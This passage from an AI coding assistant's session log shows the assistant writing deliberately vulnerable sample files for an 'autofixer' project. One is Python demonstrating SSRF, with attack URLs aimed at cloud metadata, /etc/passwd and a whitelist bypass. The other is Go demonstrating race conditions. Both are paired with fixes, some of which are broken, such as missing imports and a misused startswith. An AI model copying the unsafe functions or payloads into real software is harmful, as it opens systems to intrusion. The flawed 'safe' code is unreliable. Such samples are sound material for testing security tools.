Link-local\\n    if first == 169 and second == 254:\\n        return True\\n    \\n    return False\\n\\n\\n# SAFE: Using a proxy service\\ndef fetch_via_proxy_safe(url: str):\\n    # SAFE: Route requests through a controlled proxy that validates URLs\\n    # The proxy can enforce restrictions and prevent SSRF\\n    proxy_url = \\"http://internal-proxy:8080/fetch\\"\\n    response = requests.post(\\n        proxy_url,\\n        json={\\"url\\": url},\\n        timeout=10\\n    )\\n    return response.json()[\\"content\\"]\\n\\n\\n# SAFE: Restrict to specific API endpoints\\ndef fetch_api_endpoint_safe(endpoint: str):\\n    # SAFE: Build URL from whitelisted base and validated endpoint\\n    BASE_URL = \\"https://api.example.com/v1\\"\\n    ALLOWED_ENDPOINTS = [\\"/users\\", \\"/posts\\", \\"/comments\\"]\\n    \\n    # SAFE: Validate endpoint is whitelisted\\n    if endpoint not in ALLOWED_ENDPOINTS:\\n        raise ValueError(\\"Endpoint not allowed\\")\\n    \\n    # SAFE: Prevent path traversal\\n    if \\"..\\" in endpoint or \\"/\\" not in endpoint.startswith(\\"/\\"):\\n        raise ValueError(\\"Invalid endpoint format\\")\\n    \\n    url = BASE_URL + endpoint\\n    response = requests.get(url, timeout=10)\\n    return response.json()"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ \\"\\"\\"\\n+ Sample Python code demonstrating SSRF (Server-Side Request Forgery) vulnerability and fix\\n+ \\"\\"\\"\\n+ \\n+ import requests\\n+ import urllib.request\\n+ from urllib.parse import urlparse\\n+ import socket\\n+ \\n+ # VULNERABLE: Direct URL request without validation\\n+ def fetch_url_unsafe(url: str):\\n+     # UNSAFE: No validation - allows requests to internal services\\n+     # Attack: http://169.254.169.254/latest/meta-data/ (AWS metadata)\\n+     # Attack: http://localhost:8080/admin (internal admin panel)\\n+     # Attack: file:///etc/passwd (local file access)\\n+     response = requests.get(url)\\n+     return response.text\\n+ \\n+ \\n+ # VULNERABLE: Using urllib without restrictions\\n+ def download_file_unsafe(url: str):\\n+     # UNSAFE: Can access internal networks, localhost, cloud metadata\\n+     with urllib.request.urlopen(url) as response:\\n+         return response.read()\\n+ \\n+ \\n+ # VULNERABLE: URL whitelist bypass\\n+ def fetch_url_unsafe_whitelist(url: str):\\n+     # UNSAFE: Whitelist can be bypassed with @ or # tricks\\n+     # Attack: http://evil.com@internal-host/admin\\n+     # Attack: http://public-site.com#@internal-host/admin\\n+     allowed_domains = [\\"api.example.com\\", \\"cdn.example.com\\"]\\n+     parsed = urlparse(url)\\n+     if parsed.hostname in allowed_domains:\\n+         return requests.get(url).text  # Still vulnerable!\\n+     return None\\n+ \\n+ \\n+ # VULNERABLE: DNS rebinding attacks\\n+ def fetch_with_dns_resolve_unsafe(url: str):\\n+     # UNSAFE: DNS can change between resolve and request\\n+     parsed = urlparse(url)\\n+     resolved_ip = socket.gethostbyname(parsed.hostname)\\n+     \\n+     # Check if IP is internal\\n+     if resolved_ip.startswith(\\"127.\\") or resolved_ip.startswith(\\"10.\\"):\\n+         return None\\n+     \\n+     # UNSAFE: DNS can rebind between check and request!\\n+     return requests.get(url).text\\n+ \\n+ \\n+ # SAFE: Whitelist with proper validation\\n+ def fetch_url_safe(url: str):\\n+     ALLOWED_SCHEMES = [\\"https\\"]\\n+     ALLOWED_DOMAINS = [\\"api.example.com\\", \\"cdn.example.com\\"]\\n+     \\n+     parsed = urlparse(url)\\n+     \\n+     # SAFE: Validate scheme\\n+     if parsed.scheme not in ALLOWED_SCHEMES:\\n+         raise ValueError(\\"Only HTTPS allowed\\")\\n+     \\n+     # SAFE: Validate hostname\\n+     if parsed.hostname not in ALLOWED_DOMAINS:\\n+         raise ValueError(\\"Domain not in whitelist\\")\\n+     \\n+     # SAFE: Validate no user/password in URL\\n+     if parsed.username or parsed.password:\\n+         raise ValueError(\\"Credentials in URL not allowed\\")\\n+     \\n+     # SAFE: Validate no internal IPs\\n+     try:\\n+         resolved_ip = socket.gethostbyname(parsed.hostname)\\n+         if is_internal_ip(resolved_ip):\\n+             raise ValueError(\\"Internal IP addresses not allowed\\")\\n+     except socket.gaierror:\\n+         raise ValueError(\\"Invalid hostname\\")\\n+     \\n+     # SAFE: Use request with timeout and redirect limits\\n+     response = requests.get(\\n+         url,\\n+         timeout=10,\\n+         allow_redirects=False,  # Prevent redirect attacks\\n+         verify=True  # Verify SSL certificates\\n+     )\\n+     return response.text\\n+ \\n+ \\n+ # SAFE: IP address validation\\n+ def is_internal_ip(ip: str) -> bool:\\n+     # SAFE: Check for private/internal IP ranges\\n+     parts = ip.split(\\".\\")\\n+     if len(parts) != 4:\\n+         return False\\n+     \\n+     first = int(parts[0])\\n+     second = int(parts[1])\\n+     \\n+     # RFC 1918 private ranges\\n+     if first == 10:\\n+         return True\\n+     if first == 172 and 16 <= second <= 31:\\n+         return True\\n+     if first == 192 and second == 168:\\n+         return True\\n+     \\n+     # Localhost\\n+     if first == 127:\\n+         return True\\n+     \\n+     # Link-local\\n+     if first == 169 and second == 254:\\n+         return True\\n+     \\n+     return False\\n+ \\n+ \\n+ # SAFE: Using a proxy service\\n+ def fetch_via_proxy_safe(url: str):\\n+     # SAFE: Route requests through a controlled proxy that validates URLs\\n+     # The proxy can enforce restrictions and prevent SSRF\\n+     proxy_url = \\"http://internal-proxy:8080/fetch\\"\\n+     response = requests.post(\\n+         proxy_url,\\n+         json={\\"url\\": url},\\n+         timeout=10\\n+     )\\n+     return response.json()[\\"content\\"]\\n+ \\n+ \\n+ # SAFE: Restrict to specific API endpoints\\n+ def fetch_api_endpoint_safe(endpoint: str):\\n+     # SAFE: Build URL from whitelisted base and validated endpoint\\n+     BASE_URL = \\"https://api.example.com/v1\\"\\n+     ALLOWED_ENDPOINTS = [\\"/users\\", \\"/posts\\", \\"/comments\\"]\\n+     \\n+     # SAFE: Validate endpoint is whitelisted\\n+     if endpoint not in ALLOWED_ENDPOINTS:\\n+         raise ValueError(\\"Endpoint not allowed\\")\\n+     \\n+     # SAFE: Prevent path traversal\\n+     if \\"..\\" in endpoint or \\"/\\" not in endpoint.startswith(\\"/\\"):\\n+         raise ValueError(\\"Invalid endpoint format\\")\\n+     \\n+     url = BASE_URL + endpoint\\n+     response = requests.get(url, timeout=10)\\n+     return response.json()","oldStart":1,"newStart":1,"oldLines":1,"newLines":148,"linesRemoved":1,"linesAdded":148}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample_ssrf_vulnerable.py.","contentsAfterEdit":"\\"\\"\\"\\nSample Python code demonstrating SSRF (Server-Side Request Forgery) vulnerability and fix\\n\\"\\"\\"\\n\\nimport requests\\nimport urllib.request\\nfrom urllib.parse import urlparse\\nimport socket\\n\\n# VULNERABLE: Direct URL request without validation\\ndef fetch_url_unsafe(url: str):\\n    # UNSAFE: No validation - allows requests to internal services\\n    # Attack: http://169.254.169.254/latest/meta-data/ (AWS metadata)\\n    # Attack: http://localhost:8080/admin (internal admin panel)\\n    # Attack: file:///etc/passwd (local file access)\\n    response = requests.get(url)\\n    return response.text\\n\\n\\n# VULNERABLE: Using urllib without restrictions\\ndef download_file_unsafe(url: str):\\n    # UNSAFE: Can access internal networks, localhost, cloud metadata\\n    with urllib.request.urlopen(url) as response:\\n        return response.read()\\n\\n\\n# VULNERABLE: URL whitelist bypass\\ndef fetch_url_unsafe_whitelist(url: str):\\n    # UNSAFE: Whitelist can be bypassed with @ or # tricks\\n    # Attack: http://evil.com@internal-host/admin\\n    # Attack: http://public-site.com#@internal-host/admin\\n    allowed_domains = [\\"api.example.com\\", \\"cdn.example.com\\"]\\n    parsed = urlparse(url)\\n    if parsed.hostname in allowed_domains:\\n        return requests.get(url).text  # Still vulnerable!\\n    return None\\n\\n\\n# VULNERABLE: DNS rebinding attacks\\ndef fetch_with_dns_resolve_unsafe(url: str):\\n    # UNSAFE: DNS can change between resolve and request\\n    parsed = urlparse(url)\\n    resolved_ip = socket.gethostbyname(parsed.hostname)\\n    \\n    # Check if IP is internal\\n    if resolved_ip.startswith(\\"127.\\") or resolved_ip.startswith(\\"10.\\"):\\n        return None\\n    \\n    # UNSAFE: DNS can rebind between check and request!\\n    return requests.get(url).text\\n\\n\\n# SAFE: Whitelist with proper validation\\ndef fetch_url_safe(url: str):\\n    ALLOWED_SCHEMES = [\\"https\\"]\\n    ALLOWED_DOMAINS = [\\"api.example.com\\", \\"cdn.example.com\\"]\\n    \\n    parsed = urlparse(url)\\n    \\n    # SAFE: Validate scheme\\n    if parsed.scheme not in ALLOWED_SCHEMES:\\n        raise ValueError(\\"Only HTTPS allowed\\")\\n    \\n    # SAFE: Validate hostname\\n    if parsed.hostname not in ALLOWED_DOMAINS:\\n        raise ValueError(\\"Domain not in whitelist\\")\\n    \\n    # SAFE: Validate no user/password in URL\\n    if parsed.username or parsed.password:\\n        raise ValueError(\\"Credentials in URL not allowed\\")\\n    \\n    # SAFE: Validate no internal IPs\\n    try:\\n        resolved_ip = socket.gethostbyname(parsed.hostname)\\n        if is_internal_ip(resolved_ip):\\n            raise ValueError(\\"Internal IP addresses not allowed\\")\\n    except socket.gaierror:\\n        raise ValueError(\\"Invalid hostname\\")\\n    \\n    # SAFE: Use request with timeout and redirect limits\\n    response = requests.get(\\n        url,\\n        timeout=10,\\n        allow_redirects=False,  # Prevent redirect attacks\\n        verify=True  # Verify SSL certificates\\n    )\\n    return response.text\\n\\n\\n# SAFE: IP address validation\\ndef is_internal_ip(ip: str) -> bool:\\n    # SAFE: Check for private/internal IP ranges\\n    parts = ip.split(\\".\\")\\n    if len(parts) != 4:\\n        return False\\n    \\n    first = int(parts[0])\\n    second = int(parts[1])\\n    \\n    # RFC 1918 private ranges\\n    if first == 10:\\n        return True\\n    if first == 172 and 16 <= second <= 31:\\n        return True\\n    if first == 192 and second == 168:\\n        return True\\n    \\n    # Localhost\\n    if first == 127:\\n        return True\\n    \\n    # Link-local\\n    if first == 169 and second == 254:\\n        return True\\n    \\n    return False\\n\\n\\n# SAFE: Using a proxy service\\ndef fetch_via_proxy_safe(url: str):\\n    # SAFE: Route requests through a controlled proxy that validates URLs\\n    # The proxy can enforce restrictions and prevent SSRF\\n    proxy_url = \\"http://internal-proxy:8080/fetch\\"\\n    response = requests.post(\\n        proxy_url,\\n        json={\\"url\\": url},\\n        timeout=10\\n    )\\n    return response.json()[\\"content\\"]\\n\\n\\n# SAFE: Restrict to specific API endpoints\\ndef fetch_api_endpoint_safe(endpoint: str):\\n    # SAFE: Build URL from whitelisted base and validated endpoint\\n    BASE_URL = \\"https://api.example.com/v1\\"\\n    ALLOWED_ENDPOINTS = [\\"/users\\", \\"/posts\\", \\"/comments\\"]\\n    \\n    # SAFE: Validate endpoint is whitelisted\\n    if endpoint not in ALLOWED_ENDPOINTS:\\n        raise ValueError(\\"Endpoint not allowed\\")\\n    \\n    # SAFE: Prevent path traversal\\n    if \\"..\\" in endpoint or \\"/\\" not in endpoint.startswith(\\"/\\"):\\n        raise ValueError(\\"Invalid endpoint format\\")\\n    \\n    url = BASE_URL + endpoint\\n    response = requests.get(url, timeout=10)\\n    return response.json()\\n"}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:26:27.953Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_race_condition.go"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_race_condition.go", "contents": "package main\\n\\nimport (\\n\\t\\"fmt\\"\\n\\t\\"os\\"\\n\\t\\"path/filepath\\"\\n\\t\\"sync\\"\\n\\t\\"time\\"\\n)\\n\\n// VULNERABLE: Time-of-check to time-of-use (TOCTOU) race condition\\nfunc createFileUnsafe(filename string) error {\\n\\t// UNSAFE: Check and use are not atomic\\n\\t// Between check and open, attacker can create symlink to sensitive file\\n\\tif _, err := os.Stat(filename); os.IsNotExist(err) {\\n\\t\\t// Race condition window here!\\n\\t\\tfile, err := os.Create(filename)\\n\\t\\tif err != nil {\\n\\t\\t\\treturn err\\n\\t\\t}\\n\\t\\tfile.Close()\\n\\t}\\n\\treturn nil\\n}\\n\\n// VULNERABLE: Non-atomic file operations\\nfunc writeToFileUnsafe(filename string, data []byte) error {\\n\\t// UNSAFE: Multiple non-atomic operations allow race conditions\\n\\tfile, err := os.OpenFile(filename, os.O_RDWR|os.O_CREATE, 0644)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\n\\t// UNSAFE: Another process could modify file between open and write\\n\\ttime.Sleep(10 * time.Millisecond) // Simulating some processing time\\n\\t_, err = file.Write(data)\\n\\treturn err\\n}\\n\\n// VULNERABLE: Unsafe concurrent access without synchronization\\nvar globalCounter int\\n\\nfunc incrementUnsafe() {\\n\\t// UNSAFE: Read-modify-write is not atomic\\n\\tglobalCounter++ // This is actually three operations: read, modify, write\\n}\\n\\nfunc incrementUnsafeDetailed() {\\n\\t// UNSAFE: Explicitly showing the non-atomic operations\\n\\tval := globalCounter // Read\\n\\tval++                // Modify\\n\\tglobalCounter = val  // Write\\n\\t// Another goroutine can interleave between these operations\\n}\\n\\n// SAFE: Using O_EXCL flag for atomic file creation\\nfunc createFileSafe(filename string) error {\\n\\t// SAFE: O_EXCL ensures file creation and existence check are atomic\\n\\tfile, err := os.OpenFile(filename, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0644)\\n\\tif err != nil {\\n\\t\\tif os.IsExist(err) {\\n\\t\\t\\treturn fmt.Errorf(\\"file already exists\\")\\n\\t\\t}\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\treturn nil\\n}\\n\\n// SAFE: Using file locks for atomic operations\\nfunc writeToFileSafe(filename string, data []byte) error {\\n\\t// SAFE: Open with exclusive lock\\n\\tfile, err := os.OpenFile(filename, os.O_RDWR|os.O_CREATE, 0644)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\n\\t// SAFE: Lock file for exclusive access\\n\\terr = syscall.Flock(int(file.Fd()), syscall.LOCK_EX)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer syscall.Flock(int(file.Fd()), syscall.LOCK_UN)\\n\\n\\t// SAFE: Now write is protected from concurrent access\\n\\t_, err = file.Write(data)\\n\\treturn err\\n}\\n\\n// SAFE: Using mutex for synchronized access\\nvar (\\n\\tglobalCounterSafe int\\n\\tcounterMutex     sync.Mutex\\n)\\n\\nfunc incrementSafe() {\\n\\t// SAFE: Mutex ensures read-modify-write is atomic\\n\\tcounterMutex.Lock()\\n\\tdefer counterMutex.Unlock()\\n\\tglobalCounterSafe++\\n}\\n\\n// SAFE: Using atomic operations for simple increments\\nimport \\"sync/atomic\\"\\n\\nvar globalCounterAtomic int64\\n\\nfunc incrementAtomic() {\\n\\t// SAFE: Atomic increment is guaranteed to be thread-safe\\n\\tatomic.AddInt64(&globalCounterAtomic, 1)\\n}\\n\\nfunc getCounterAtomic() int64 {\\n\\t// SAFE: Atomic read ensures we get consistent value\\n\\treturn atomic.LoadInt64(&globalCounterAtomic)\\n}\\n\\n// SAFE: Using channels for safe concurrent communication\\nfunc processWithChannel(items []int) {\\n\\t// SAFE: Channel provides safe synchronization\\n\\tresults := make(chan int, len(items))\\n\\t\\n\\tvar wg sync.WaitGroup\\n\\tfor _, item := range items {\\n\\t\\twg.Add(1)\\n\\t\\tgo func(val int) {\\n\\t\\t\\tdefer wg.Done()\\n\\t\\t\\t// Process item\\n\\t\\t\\tresult := val * 2\\n\\t\\t\\tresults <- result\\n\\t\\t}(item)\\n\\t}\\n\\t\\n\\tgo func() {\\n\\t\\twg.Wait()\\n\\t\\tclose(results)\\n\\t}()\\n\\t\\n\\t// Collect results safely\\n\\tfor result := range results {\\n\\t\\tfmt.Println(result)\\n\\t}\\n}\\n\\n// SAFE: Validating file path before use\\nfunc validateAndUseFile(filepath string) error {\\n\\t// SAFE: Resolve symlinks and validate path\\n\\trealPath, err := filepath.EvalSymlinks(filepath)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\t\\n\\t// SAFE: Verify path is within allowed directory\\n\\tallowedDir := \\"/safe/directory\\"\\n\\tabsRealPath, _ := filepath.Abs(realPath)\\n\\tabsAllowed, _ := filepath.Abs(allowedDir)\\n\\t\\n\\tif !strings.HasPrefix(absRealPath, absAllowed) {\\n\\t\\treturn fmt.Errorf(\\"path outside allowed directory\\")\\n\\t}\\n\\t\\n\\t// SAFE: Now use the validated path\\n\\tfile, err := os.Open(absRealPath)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\t\\n\\treturn nil\\n}"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ package main\\n+ \\n+ import (\\n+ \\t\\"fmt\\"\\n+ \\t\\"os\\"\\n+ \\t\\"path/filepath\\"\\n+ \\t\\"sync\\"\\n+ \\t\\"time\\"\\n+ )\\n+ \\n+ // VULNERABLE: Time-of-check to time-of-use (TOCTOU) race condition\\n+ func createFileUnsafe(filename string) error {\\n+ \\t// UNSAFE: Check and use are not atomic\\n+ \\t// Between check and open, attacker can create symlink to sensitive file\\n+ \\tif _, err := os.Stat(filename); os.IsNotExist(err) {\\n+ \\t\\t// Race condition window here!\\n+ \\t\\tfile, err := os.Create(filename)\\n+ \\t\\tif err != nil {\\n+ \\t\\t\\treturn err\\n+ \\t\\t}\\n+ \\t\\tfile.Close()\\n+ \\t}\\n+ \\treturn nil\\n+ }\\n+ \\n+ // VULNERABLE: Non-atomic file operations\\n+ func writeToFileUnsafe(filename string, data []byte) error {\\n+ \\t// UNSAFE: Multiple non-atomic operations allow race conditions\\n+ \\tfile, err := os.OpenFile(filename, os.O_RDWR|os.O_CREATE, 0644)\\n+ \\tif err != nil {\\n+ \\t\\treturn err\\n+ \\t}\\n+ \\tdefer file.Close()\\n+ \\n+ \\t// UNSAFE: Another process could modify file between open and write\\n+ \\ttime.Sleep(10 * time.Millisecond) // Simulating some processing time\\n+ \\t_, err = file.Write(data)\\n+ \\treturn err\\n+ }\\n+ \\n+ // VULNERABLE: Unsafe concurrent access without synchronization\\n+ var globalCounter int\\n+ \\n+ func incrementUnsafe() {\\n+ \\t// UNSAFE: Read-modify-write is not atomic\\n+ \\tglobalCounter++ // This is actually three operations: read, modify, write\\n+ }\\n+ \\n+ func incrementUnsafeDetailed() {\\n+ \\t// UNSAFE: Explicitly showing the non-atomic operations\\n+ \\tval := globalCounter // Read\\n+ \\tval++                // Modify\\n+ \\tglobalCounter = val  // Write\\n+ \\t// Another goroutine can interleave between these operations\\n+ }\\n+ \\n+ // SAFE: Using O_EXCL flag for atomic file creation\\n+ func createFileSafe(filename string) error {\\n+ \\t// SAFE: O_EXCL ensures file creation and existence check are atomic\\n+ \\tfile, err := os.OpenFile(filename, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0644)\\n+ \\tif err != nil {\\n+ \\t\\tif os.IsExist(err) {\\n+ \\t\\t\\treturn fmt.Errorf(\\"file already exists\\")\\n+ \\t\\t}\\n+ \\t\\treturn err\\n+ \\t}\\n+ \\tdefer file.Close()\\n+ \\treturn nil\\n+ }\\n+ \\n+ // SAFE: Using file locks for atomic operations\\n+ func writeToFileSafe(filename string, data []byte) error {\\n+ \\t// SAFE: Open with exclusive lock\\n+ \\tfile, err := os.OpenFile(filename, os.O_RDWR|os.O_CREATE, 0644)\\n+ \\tif err != nil {\\n+ \\t\\treturn err\\n+ \\t}\\n+ \\tdefer file.Close()\\n+ \\n+ \\t// SAFE: Lock file for exclusive access\\n+ \\terr = syscall.Flock(int(file.Fd()), syscall.LOCK_EX)\\n+ \\tif err != nil {\\n+ \\t\\treturn err\\n+ \\t}\\n+ \\tdefer syscall.Flock(int(file.Fd()), syscall.LOCK_UN)\\n+ \\n+ \\t// SAFE: Now write is protected from concurrent access\\n+ \\t_, err = file.Write(data)\\n+ \\treturn err\\n+ }\\n+ \\n+ // SAFE: Using mutex for synchronized access\\n+ var (\\n+ \\tglobalCounterSafe int\\n+ \\tcounterMutex     sync.Mutex\\n+ )\\n+ \\n+ func incrementSafe() {\\n+ \\t// SAFE: Mutex ensures read-modify-write is atomic\\n+ \\tcounterMutex.Lock()\\n+ \\tdefer counterMutex.Unlock()\\n+ \\tglobalCounterSafe++\\n+ }\\n+ \\n+ // SAFE: Using atomic operations for simple increments\\n+ import \\"sync/atomic\\"\\n+ \\n+ var globalCounterAtomic int64\\n+ \\n+ func incrementAtomic() {\\n+ \\t// SAFE: Atomic increment is guaranteed to be thread-safe\\n+ \\tatomic.AddInt64(&globalCounterAtomic, 1)\\n+ }\\n+ \\n+ func getCounterAtomic() int64 {\\n+ \\t// SAFE: Atomic read ensures we get consistent value\\n+ \\treturn atomic.LoadInt64(&globalCounterAtomic)\\n+ }\\n+ \\n+ // SAFE: Using channels for safe concurrent communication\\n+ func processWithChannel(items []int) {\\n+ \\t// SAFE: Channel provides safe synchronization\\n+ \\tresults := make(chan int, len(items))\\n+ \\t\\n+ \\tvar wg sync.WaitGroup\\n+ \\tfor _, item := range items {\\n+ \\t\\twg.Add(1)\\n+ \\t\\tgo func(val int) {\\n+ \\t\\t\\tdefer wg.Done()\\n+ \\t\\t\\t// Process item\\n+ \\t\\t\\tresult := val * 2\\n+ \\t\\t\\tresults <- result\\n+ \\t\\t}(item)\\n+ \\t}\\n+ \\t\\n+ \\tgo func() {\\n+ \\t\\twg.Wait()\\n+ \\t\\tclose(results)\\n+ \\t}()\\n+ \\t\\n+ \\t// Collect results safely\\n+ \\tfor result := range results {\\n+ \\t\\tfmt.Println(result)\\n+ \\t}\\n+ }\\n+ \\n+ // SAFE: Validating file path before use\\n+ func validateAndUseFile(filepath string) error {\\n+ \\t// SAFE: Resolve symlinks and validate path\\n+ \\trealPath, err := filepath.EvalSymlinks(filepath)\\n+ \\tif err != nil {\\n+ \\t\\treturn err\\n+ \\t}\\n+ \\t\\n+ \\t// SAFE: Verify path is within allowed directory\\n+ \\tallowedDir := \\"/safe/directory\\"\\n+ \\tabsRealPath, _ := filepath.Abs(realPath)\\n+ \\tabsAllowed, _ := filepath.Abs(allowedDir)\\n+ \\t\\n+ \\tif !strings.HasPrefix(absRealPath, absAllowed) {\\n+ \\t\\treturn fmt.Errorf(\\"path outside allowed directory\\")\\n+ \\t}\\n+ \\t\\n+ \\t// SAFE: Now use the validated path\\n+ \\tfile, err := os.Open(absRealPath)\\n+ \\tif err != nil {\\n+ \\t\\treturn err\\n+ \\t}\\n+ \\tdefer file.Close()\\n+ \\t\\n+ \\treturn nil\\n+ }","oldStart":1,"newStart":1,"oldLines":1,"newLines":172,"linesRemoved":1,"linesAdded":172}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample_race_condition.go.","contentsAfterEdit":"package main\\n\\nimport (\\n\\t\\"fmt\\"\\n\\t\\"os\\"\\n\\t\\"path/filepath\\"\\n\\t\\"sync\\"\\n\\t\\"time\\"\\n)\\n\\n// VULNERABLE: Time-of-check to time-of-use (TOCTOU) race condition\\nfunc createFileUnsafe(filename string) error {\\n\\t// UNSAFE: Check and use are not atomic\\n\\t// Between check and open, attacker can create symlink to sensitive file\\n\\tif _, err := os.Stat(filename); os.IsNotExist(err) {\\n\\t\\t// Race condition window here!\\n\\t\\tfile, err := os.Create(filename)\\n\\t\\tif err != nil {\\n\\t\\t\\treturn err\\n\\t\\t}\\n\\t\\tfile.Close()\\n\\t}\\n\\treturn nil\\n}\\n\\n// VULNERABLE: Non-atomic file operations\\nfunc writeToFileUnsafe(filename string, data []byte) error {\\n\\t// UNSAFE: Multiple non-atomic operations allow race conditions\\n\\tfile, err := os.OpenFile(filename, os.O_RDWR|os.O_CREATE, 0644)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\n\\t// UNSAFE: Another process could modify file between open and write\\n\\ttime.Sleep(10 * time.Millisecond) // Simulating some processing time\\n\\t_, err = file.Write(data)\\n\\treturn err\\n}\\n\\n// VULNERABLE: Unsafe concurrent access without synchronization\\nvar globalCounter int\\n\\nfunc incrementUnsafe() {\\n\\t// UNSAFE: Read-modify-write is not atomic\\n\\tglobalCounter++ // This is actually three operations: read, modify, write\\n}\\n\\nfunc incrementUnsafeDetailed() {\\n\\t// UNSAFE: Explicitly showing the non-atomic operations\\n\\tval := globalCounter // Read\\n\\tval++                // Modify\\n\\tglobalCounter = val  // Write\\n\\t// Another goroutine can interleave between these operations\\n}\\n\\n// SAFE: Using O_EXCL flag for atomic file creation\\nfunc createFileSafe(filename string) error {\\n\\t// SAFE: O_EXCL ensures file creation and existence check are atomic\\n\\tfile, err := os.OpenFile(filename, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0644)\\n\\tif err != nil {\\n\\t\\tif os.IsExist(err) {\\n\\t\\t\\treturn fmt.Errorf(\\"file already exists\\")\\n\\t\\t}\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\treturn nil\\n}\\n\\n// SAFE: Using file locks for atomic operations\\nfunc writeToFileSafe(filename string, data []byte) error {\\n\\t// SAFE: Open with exclusive lock\\n\\tfile, err := os.OpenFile(filename, os.O_RDWR|os.O_CREATE, 0644)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\n\\t// SAFE: Lock file for exclusive access\\n\\terr = syscall.Flock(int(file.Fd()), syscall.LOCK_EX)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer syscall.Flock(int(file.Fd()), syscall.LOCK_UN)\\n\\n\\t// SAFE: Now write is protected from concurrent access\\n\\t_, err = file.Write(data)\\n\\treturn err\\n}\\n\\n// SAFE: Using mutex for synchronized access\\nvar (\\n\\tglobalCounterSafe int\\n\\tcounterMutex     sync.Mutex\\n)\\n\\nfunc incrementSafe() {\\n\\t// SAFE: Mutex ensures read-modify-write is atomic\\n\\tcounterMutex.Lock()\\n\\tdefer counterMutex.Unlock()\\n\\tglobalCounterSafe++\\n}\\n\\n// SAFE: Using atomic operations for simple increments\\nimport \\"sync/atomic\\"\\n\\nvar globalCounterAtomic int64\\n\\nfunc incrementAtomic() {\\n\\t// SAFE: Atomic increment is guaranteed to be thread-safe\\n\\tatomic.AddInt64(&globalCounterAtomic, 1)\\n}\\n\\nfunc getCounterAtomic() int64 {\\n\\t// SAFE: Atomic read ensures we get consistent value\\n\\treturn atomic.LoadInt64(&globalCounterAtomic)\\n}\\n\\n// SAFE: Using channels for safe concurrent communication\\nfunc processWithChannel(items []int) {\\n\\t// SAFE: Channel provides safe synchronization\\n\\tresults := make(chan int, len(items))\\n\\t\\n\\tvar wg sync.WaitGroup\\n\\tfor _, item := range items {\\n\\t\\twg.Add(1)\\n\\t\\tgo func(val int) {\\n\\t\\t\\tdefer wg.Done()\\n\\t\\t\\t// Process item\\n\\t\\t\\tresult := val * 2\\n\\t\\t\\tresults <- result\\n\\t\\t}(item)\\n\\t}\\n\\t\\n\\tgo func() {\\n\\t\\twg.Wait()\\n\\t\\tclose(results)\\n\\t}()\\n\\t\\n\\t// Collect results safely\\n\\tfor result := range results {\\n\\t\\tfmt.Println(result)\\n\\t}\\n}\\n\\n// SAFE: Validating file path before use\\nfunc validateAndUseFile(filepath string) error {\\n\\t// SAFE: Resolve symlinks and validate path\\n\\trealPath, err := filepath.EvalSymlinks(filepath)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\t\\n\\t// SAFE: Verify path is within allowed directory\\n\\tallowedDir := \\"/safe/directory\\"\\n\\tabsRealPath, _ := filepath.Abs(realPath)\\n\\tabsAllowed, _ := filepath.Abs(allowedDir)\\n\\t\\n\\tif !strings.HasPrefix(absRealPath, absAllowed) {\\n\\t\\treturn fmt.Errorf(\\"path outside allowed directory\\")\\n\\t}\\n\\t\\n\\t// SAFE: Now use the validated path\\n\\tfile, err := os.Open(absRealPath)\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\tdefer file.Close()\\n\\t\\n\\treturn nil\\n}\\n"}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:27:10.390Z,
        "text": "Checking lint errors in the new files:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:27:10.461Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "read_lints",
          "parameters": "{"paths":["sample_ssrf_vulnerable.py","sample_race_condition.go"]}",
          "rawArguments": "{"paths": ["sample_ssrf_vulnerable.py","sample_race_condition.go"]}",
          "result": "{}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:27:18.776Z,
        "text": "Fixing missing imports in the Go file:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:27:18.814Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "read_file",
          "parameters": "{"targetFile":"/Users/jonathanafek/src/autofixer/sample_race_condition.go","charsLimit":100000,"effectiveUri":"file:///Users/jonathanafek/src/autofixer/sample_race_condition.go"}",
          "rawArguments": "{"target_file": "/Users/jonathanafek/src/autofixer/sample_race_condition.go"}",
